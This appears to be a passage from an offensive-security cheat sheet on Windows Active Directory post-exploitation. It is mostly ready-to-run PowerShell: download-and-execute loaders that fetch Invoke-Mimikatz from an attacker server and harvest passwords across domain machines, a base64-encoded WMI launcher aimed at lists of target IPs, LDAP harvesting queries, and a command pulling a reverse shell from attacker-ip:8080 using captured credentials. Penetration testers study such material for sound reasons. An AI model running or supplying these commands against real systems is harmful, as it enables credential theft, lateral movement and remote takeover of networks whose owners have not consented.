$browser = New-Object System.Net.WebClient
IEX($browser.DownloadString("http://[your-server-ip]:[port]/Invoke-Mimikatz.ps1"))
invoke-Mimikatz
```

### Running the above script on multiple domain joined machines to harvest all passwords

```powershell
$browser = New-Object System.Net.WebClient
IEX($browser.DownloadString("http://[your-server-ip]:[port]/Invoke-Mimikatz.ps1"))

invoke-mimikatz -Computer FRSV27, FRSV210,FRSV229, FRSV97 |out-file result.txt -Append

```

FRSV2010..are the targeted computer names which you can get by running nslookup on the corresponding IP

Save it as Mimikatz.ps1 and run it.

This script depends and relies on winrm (5985) to be enabled on the target you are running the script from, you can enable it with the following command:

Wmic /user:admin /password:password /node:\[ip] process call create "powersell enable-PSRemoting -force"

### Powershell script that Downloads Mimikatz and executes it on multiple defined machines using WMI. Use it if the above method failed

Scenario 1: You have just compromised a domain-joined machine / domain-controller / regular work station and want to harvest the passwords / hashes of other domain-joined machines then you can use the below script to launch it from the host you have just compromised.

Scenario 2: You have compromised a non domain-joined machine and want to download and execute mimikatz as stealthy as possible then you can use the script below and stop at the green highlight.

```powershell
$command = '$browser = New-ObjectSystem.Net.WebClient; 
IEX($browser.DownloadString("http:// [your-server-ip]:[port]/Invoke-Mimikatz.ps1"));
$machine_name = (get-netadapter | getnetipaddress | ? addressfamily -eq "IPv4").ipaddress;invoke-mimikatz | out-file c:\windows\temp\$machine_name".txt"'
$bytes =[System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

$PC_IP = @("[target-ip-1]", "[target-ip-2]")
ForEach ($X in $PC_IP) {
$proc = invoke-wmimethod -ComputerName $X
win32_process -name create -argumentlist ("powershell -encodedcommand $encodedCommand")
$proc_id = $proc.processId
do {(Write-Host "[*] Waiting for mimi to finish on $X"),
(Start-Sleep -Seconds 2)} until ((Get-WMIobject -Class Win32_process -Filter "ProcessId=$proc_id" -ComputerName $X | where {$_.ProcessId -eq $proc_id}).ProcessID -eq $null)
move-item -path "\\$X\C$\windows\temp\$X.txt" -Destination C:\users\Administrator\desktop\ -force write-host "[+] Got file for $X" -foregroundcolor "green"
}

```

write-host $encodedCommand \[include this command if you are running this script for a single host and stop here].

### Executing LDAP queries for data harvest

#### Harvesting computer names

```powershell
(New-Object adsisearcher((New-Object adsi("LDAP://dc.domaincontroller.local","target-machine\ldap","target-machine-pass")),"(objectCategory=Computer)")).FindAll() | %{ $_.Properties.name }


(New-Object adsisearcher((New-Object adsi("LDAP://dc.fulcrum.local","fulcrum\ldap","PasswordForSearching123!")),"(objectCategory=Computer)")).FindAll() | %{ $_.Properties.name }
```

#### Harvesting other information

```powershell
(New-Object adsisearcher((New-Object adsi("LDAP://dc.domaincontroller.local","target-machine\ldap","target-machine-pass")),"(info=*)")).FindAll() | %{ $_.Properties }

(New-Object adsisearcher((New-Object adsi("LDAP://dc.fulcrum.local","fulcrum\ldap","PasswordForSearching123!")),"(info=*)")).FindAll() | %{ $_.Properties }

```

### Accessing the netlogon share on DC

If you managed to compromise a machine part of a domain controller then you can use the machine credentials usually \[username:pass] to access the netlogon share on the domain controller. Netlogon share stores group policy login scripts files and other executables. Execute the below powershell command

```
PS > net use \\dc.domaincontroller.local\netlogon   /user:domainname\username password
```

### Executing remote commands on a domain machine with their pair of credentials and winrm open \[run as method]

If you have got authentication credentials for a machine and you want to execute commands remotely, then execute the below powershell. Make sure to substitute \[open-port]

```powershell
PS > $pass = convertto-securestring -AsPlainText -Force -String 'pass'; 

PS > $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist 'domainname\username',$pass; 

PS > Invoke-Command -ComputerName computer-name -Credential $cred -Port 5985 -ScriptBlock { command }

```

The next example will execute use the credentials obtained and retrieve a shell from the attacker machine `shell.ps` that could be `nishasng shell` and you should receive the shell back from the vicitim machine to your listener.

```powershell
PS C:\inetpub\wwwroot\internal-01\log> $username = "pentesting.local\Administrator" 

PS C:\inetpub\wwwroot\internal-01\log> $password = "3130457h31186feef962f597711faddb"

PS C:\inetpub\wwwroot\internal-01\log> $securestring = New-Object -TypeName System.Security.SecureString 

PS C:\inetpub\wwwroot\internal-01\log> $password.ToCharArray() | ForEach-Object {$securestring.AppendChar($_)} 

PS C:\inetpub\wwwroot\internal-01\log> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $securestring 

PS C:\inetpub\wwwroot\internal-01\log> Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://attacker-ip:8080/shell.ps1') } -Credential $cred -Computer localhost
```
